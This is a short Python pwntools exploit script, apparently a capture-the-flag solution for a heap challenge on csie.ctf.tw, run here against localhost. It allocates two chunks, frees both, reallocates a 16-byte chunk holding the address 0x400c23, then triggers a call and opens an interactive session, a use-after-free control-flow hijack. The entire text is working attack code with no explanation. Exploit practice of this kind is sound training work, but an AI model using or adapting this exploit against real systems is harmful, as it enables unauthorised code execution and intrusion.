from pwn import *
from time import sleep
context.arch = 'amd64'

#r = remote('csie.ctf.tw',10137)
r = remote('localhost',8888)

#r.interactive()
size = '64'
content = 'faceb00c'
magic = 0x400c23

#first two
r.send('1')
sleep(0.01)
r.send(size)
sleep(0.01)
r.send(content)
sleep(0.01)
#
r.send('1')
sleep(0.01)
r.send(size)
sleep(0.01)
r.send(content)
sleep(0.01)
#free
r.send('2')
sleep(0.01)
r.send('0')
sleep(0.01)
r.send('2')
sleep(0.01)
r.send('1')
sleep(0.01)
#
r.send('1')
sleep(0.01)
r.send('16')
sleep(0.01)
r.send(p64(magic))
sleep(0.01)
#
r.send('3')
sleep(0.01)

r.interactive()
